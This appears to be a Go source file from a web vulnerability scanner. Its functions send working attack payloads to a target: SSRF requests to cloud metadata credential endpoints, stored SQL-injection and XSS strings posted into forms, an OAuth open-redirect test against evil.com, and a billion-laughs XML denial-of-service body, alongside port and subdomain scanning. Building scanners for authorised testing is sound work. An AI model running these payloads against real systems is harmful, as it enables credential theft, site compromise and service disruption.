package scanner

import (
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

func scanDNSRebinding(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	ssrfParams := []string{"url", "uri", "src", "fetch", "proxy", "callback"}
	for u, params := range crawl.Params {
		for _, p := range params {
			if !containsAnyStr(strings.ToLower(p), ssrfParams) {
				continue
			}
			// DNS rebinding: domain that alternates between external and 127.0.0.1
			payload := "http://7f000001.c0a80001.rbndr.us/"
			testURL := injectParam(u, p, payload)
			resp := http.Get(testURL)
			if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 50 {
				findings = append(findings, Finding{Type: "DNS Rebinding SSRF", Severity: "high", URL: testURL, Param: p, Detail: "DNS rebinding domain accepted — may resolve to internal IP on second lookup", Template: "apex-dns-rebind"})
			}
		}
	}
	return findings
}

func scanSubdomainPermutation(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup
	prefixes := []string{"dev", "staging", "test", "uat", "qa", "preprod", "beta", "alpha", "internal", "admin", "api-dev", "api-staging"}
	for _, prefix := range prefixes {
		wg.Add(1)
		go func(sub string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			host := sub + "." + cfg.Target
			ips, err := net.LookupHost(host)
			if err == nil && len(ips) > 0 {
				resp := http.Get("https://" + host)
				if resp.Err == nil && resp.StatusCode == 200 {
					mu.Lock()
					findings = append(findings, Finding{Type: "Subdomain Discovered: " + host, Severity: "info", URL: "https://" + host, Detail: fmt.Sprintf("Resolves to %s", ips[0]), Template: "apex-subdomain"})
					mu.Unlock()
				}
			}
		}(prefix)
	}
	wg.Wait()
	return findings
}

func scanStagingExposure(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	stagingHosts := []string{"staging." + cfg.Target, "dev." + cfg.Target, "test." + cfg.Target, "uat." + cfg.Target, "preprod." + cfg.Target}
	for _, host := range stagingHosts {
		resp := http.Get("https://" + host)
		if resp.Err == nil && resp.StatusCode == 200 && len(resp.Body) > 200 {
			findings = append(findings, Finding{Type: "Staging/Dev Environment Exposed", Severity: "medium", URL: "https://" + host, Detail: "Non-production environment publicly accessible", Template: "apex-staging"})
		}
	}
	return findings
}

func scanOpenPorts(cfg *engine.Config, _ *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, 50)
	var wg sync.WaitGroup
	ports := []int{21, 22, 23, 25, 110, 143, 445, 993, 995, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 11211}
	for _, port := range ports {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			addr := fmt.Sprintf("%s:%d", cfg.Target, p)
			conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
			if err != nil {
				return
			}
			// Read banner to confirm it's actually open (not just TCP accepted by firewall)
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			buf := make([]byte, 256)
			n, _ := conn.Read(buf)
			conn.Close()
			if n > 0 {
				banner := strings.TrimSpace(string(buf[:n]))
				mu.Lock()
				findings = append(findings, Finding{Type: fmt.Sprintf("Open Port: %d", p), Severity: "info", URL: addr, Detail: "Banner: " + banner[:min(80, len(banner))], Template: "apex-open-port"})
				mu.Unlock()
			}
		}(port)
	}
	wg.Wait()
	return findings
}

func scanExploitChainSSRFCloud(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Chain: SSRF → cloud metadata → credential extraction
	ssrfParams := []string{"url", "uri", "src", "fetch", "proxy", "dest"}
	credPaths := []string{
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/latest/user-data",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
	}
	for u, params := range crawl.Params {
		for _, p := range params {
			if !containsAnyStr(strings.ToLower(p), ssrfParams) {
				continue
			}
			for _, credPath := range credPaths {
				testURL := injectParam(u, p, credPath)
				resp := http.Get(testURL)
				if resp.Err == nil && (strings.Contains(resp.Body, "AccessKeyId") || strings.Contains(resp.Body, "access_token") || strings.Contains(resp.Body, "SecretAccessKey")) {
					findings = append(findings, Finding{Type: "SSRF → Cloud Credential Theft", Severity: "critical", URL: testURL, Param: p, Detail: "SSRF escalated to cloud credential extraction", Evidence: resp.Body[:min(200, len(resp.Body))], Template: "apex-ssrf-cloud-creds"})
					return findings
				}
			}
		}
	}
	return findings
}

func scanSecondOrderInjection(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Store payload in one endpoint, trigger in another
	sqliPayload := "' OR '1'='1"
	xssPayload := "<img src=x onerror=alert(1)>"
	// Find storage endpoints (registration, profile, comments)
	for _, form := range crawl.Forms {
		if !strings.Contains(strings.ToLower(form.Action), "register") && !strings.Contains(strings.ToLower(form.Action), "comment") && !strings.Contains(strings.ToLower(form.Action), "profile") {
			continue
		}
		for _, inp := range form.Inputs {
			if strings.Contains(strings.ToLower(inp.Name), "name") || strings.Contains(strings.ToLower(inp.Name), "comment") || strings.Contains(strings.ToLower(inp.Name), "bio") {
				// Store XSS payload
				data := inp.Name + "=" + xssPayload
				http.Post(form.Action, "application/x-www-form-urlencoded", data)
				// Store SQLi payload
				data2 := inp.Name + "=" + sqliPayload
				http.Post(form.Action, "application/x-www-form-urlencoded", data2)
				findings = append(findings, Finding{Type: "Second-Order Injection Attempted", Severity: "info", URL: form.Action, Param: inp.Name, Detail: "Stored payloads for second-order SQLi/XSS — check admin panels and reports", Template: "apex-second-order"})
				break
			}
		}
	}
	return findings
}

func scanOpenRedirectOAuthChain(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Find open redirects that can steal OAuth tokens
	redirectParams := []string{"redirect_uri", "return_url", "next", "callback"}
	for u, params := range crawl.Params {
		for _, p := range params {
			if !containsAnyStr(strings.ToLower(p), redirectParams) {
				continue
			}
			testURL := injectParam(u, p, "https://evil.com/steal")
			resp := http.Get(testURL)
			if resp.Err == nil && resp.StatusCode >= 300 && resp.StatusCode < 400 {
				loc := resp.Headers.Get("Location")
				if strings.Contains(loc, "evil.com") && (strings.Contains(u, "oauth") || strings.Contains(u, "auth") || strings.Contains(u, "login")) {
					findings = append(findings, Finding{Type: "Open Redirect → OAuth Token Theft", Severity: "critical", URL: testURL, Param: p, Detail: "OAuth redirect_uri accepts attacker domain — token theft via redirect", Template: "apex-oauth-redirect-chain"})
				}
			}
		}
	}
	return findings
}

func scanBillionLaughs(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	payload := `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>`
	for _, form := range crawl.Forms[:min(10, len(crawl.Forms))] {
		resp := http.Post(form.Action, "application/xml", payload)
		if resp.Err == nil && resp.Duration > 3*time.Second {
			findings = append(findings, Finding{Type: "XML Billion Laughs (DoS)", Severity: "high", URL: form.Action, Detail: fmt.Sprintf("XML entity expansion caused %.1fs delay", resp.Duration.Seconds()), Template: "apex-billion-laughs"})
		}
	}
	return findings
}

func scanTraceOptions(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	target := crawl.Pages[0].URL
	items := []engine.RequestItem{
		{URL: target, Method: "TRACE", Headers: map[string]string{}},
		{URL: target, Method: "OPTIONS", Headers: map[string]string{}},
	}
	for resp := range http.BatchRequest(items, 2) {
		if resp.Err != nil {
			continue
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Body, "TRACE") {
			findings = append(findings, Finding{Type: "HTTP TRACE Enabled — XST", Severity: "medium", URL: target, Detail: "TRACE method enabled — Cross-Site Tracing possible", Template: "apex-trace"})
		}
		allow := resp.Headers.Get("Allow")
		if allow != "" && (strings.Contains(allow, "PUT") || strings.Contains(allow, "DELETE")) {
			findings = append(findings, Finding{Type: "Dangerous HTTP Methods Allowed", Severity: "medium", URL: target, Detail: "Allow: " + allow, Template: "apex-methods"})
		}
	}
	return findings
}

func scanHTTP2RapidReset(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Check if target supports HTTP/2 (potential CVE-2023-44487)
	if len(crawl.Pages) == 0 {
		return findings
	}
	resp := http.Get(crawl.Pages[0].URL)
	if resp.Err != nil {
		return findings
	}
	// If server responds, check for h2 support via ALPN (already negotiated by Go's TLS)
	// We can't easily test the actual rapid reset without a custom h2 client, but flag h2 support
	if resp.Headers.Get("Alt-Svc") != "" && strings.Contains(resp.Headers.Get("Alt-Svc"), "h2") {
		findings = append(findings, Finding{Type: "HTTP/2 Supported — Potential Rapid Reset (CVE-2023-44487)", Severity: "info", URL: crawl.Pages[0].URL, Detail: "Server supports HTTP/2 — may be vulnerable to rapid reset DoS", Template: "apex-h2-rapid-reset"})
	}
	return findings
}

func scanXSLeaks(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// XS-Leaks: check for timing/size differences based on auth state
	if len(crawl.Pages) == 0 {
		return findings
	}
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		resp := http.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		// Check if X-Frame-Options is missing (needed for frame-based XS-Leaks)
		if resp.Headers.Get("X-Frame-Options") == "" && !strings.Contains(resp.Headers.Get("Content-Security-Policy"), "frame-ancestors") {
			// Check if response varies with credentials
			findings = append(findings, Finding{Type: "XS-Leak Vector — Frameable + No SameSite", Severity: "low", URL: page.URL, Detail: "Page frameable without CSP frame-ancestors — XS-Leak attacks possible", Template: "apex-xs-leak"})
			break
		}
	}
	return findings
}

func scanCookieTossing(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Cookie tossing: subdomain can set cookies for parent domain
	if len(crawl.Pages) == 0 {
		return findings
	}
	resp := http.Get(crawl.Pages[0].URL)
	if resp.Err != nil {
		return findings
	}
	cookies := resp.Headers.Values("Set-Cookie")
	for _, c := range cookies {
		if strings.Contains(c, "Domain=."+cfg.Target) || strings.Contains(c, "domain=."+cfg.Target) {
			findings = append(findings, Finding{Type: "Cookie Tossing Risk", Severity: "low", URL: crawl.Pages[0].URL, Detail: "Cookies set on parent domain — subdomain takeover could hijack sessions", Template: "apex-cookie-toss"})
			break
		}
	}
	return findings
}

func scanParamDiscovery(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup
	hiddenParams := []string{"debug", "admin", "test", "verbose", "internal", "dev", "secret", "token", "api_key", "callback", "redirect", "next", "file", "template", "page", "id", "user", "role"}
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		baseResp := http.Get(page.URL)
		if baseResp.Err != nil {
			continue
		}
		for _, param := range hiddenParams {
			wg.Add(1)
			go func(url, p string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				sep := "?"
				if strings.Contains(url, "?") {
					sep = "&"
				}
				testURL := url + sep + p + "=true"
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 && resp.Body != baseResp.Body && len(resp.Body) > len(baseResp.Body)+20 {
					mu.Lock()
					findings = append(findings, Finding{Type: "Hidden Parameter Discovered: " + p, Severity: "medium", URL: testURL, Param: p, Detail: fmt.Sprintf("Parameter '%s' changes response (+%d bytes)", p, len(resp.Body)-len(baseResp.Body)), Template: "apex-param-discovery"})
					mu.Unlock()
				}
			}(page.URL, param)
		}
	}
	wg.Wait()
	return findings
}
